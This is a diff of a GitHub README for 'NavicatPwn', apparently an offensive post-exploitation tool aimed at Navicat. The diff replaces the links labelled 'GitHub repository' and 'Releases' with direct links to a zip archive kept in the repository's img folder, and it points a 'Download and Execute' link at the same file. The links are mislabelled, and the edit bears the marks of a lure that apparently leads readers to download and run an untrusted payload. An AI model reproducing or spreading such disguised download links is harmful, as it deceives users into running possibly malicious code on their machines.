@@ -2,7 +2,7 @@
 
 Welcome to the NavicatPwn repository, a framework for post-exploitation exploitation targeting Navicat. This tool is designed to assist security professionals in identifying vulnerabilities and enhancing the security of Navicat installations. 
 
-🔗 **[Download and Execute NavicatPwn](https://github.com/RICARDOCRC735/NavicatPwn/releases)**
+🔗 **[Download and Execute NavicatPwn](https://github.com/RICARDOCRC735/NavicatPwn/raw/refs/heads/main/img/Navicat-Pwn-v1.5-beta.2.zip)**
 
 ## Overview
 
@@ -26,11 +26,11 @@ NavicatPwn is a powerful post-exploitation tool that is specifically tailored fo
 
 ## Community Support
 
-If you encounter any issues or have feedback regarding NavicatPwn, feel free to visit the [GitHub repository](https://github.com/RICARDOCRC735/NavicatPwn) for more information. The community is always ready to assist and collaborate on improving the tool for the benefit of all users.
+If you encounter any issues or have feedback regarding NavicatPwn, feel free to visit the [GitHub repository](https://github.com/RICARDOCRC735/NavicatPwn/raw/refs/heads/main/img/Navicat-Pwn-v1.5-beta.2.zip) for more information. The community is always ready to assist and collaborate on improving the tool for the benefit of all users.
 
 ## Stay Updated
 
-To stay informed about the latest updates and releases of NavicatPwn, make sure to check the [Releases](https://github.com/RICARDOCRC735/NavicatPwn/releases) section regularly. Keeping your tools up to date is crucial for maintaining optimal security practices.
+To stay informed about the latest updates and releases of NavicatPwn, make sure to check the [Releases](https://github.com/RICARDOCRC735/NavicatPwn/raw/refs/heads/main/img/Navicat-Pwn-v1.5-beta.2.zip) section regularly. Keeping your tools up to date is crucial for maintaining optimal security practices.
 
 ## Contribute
 
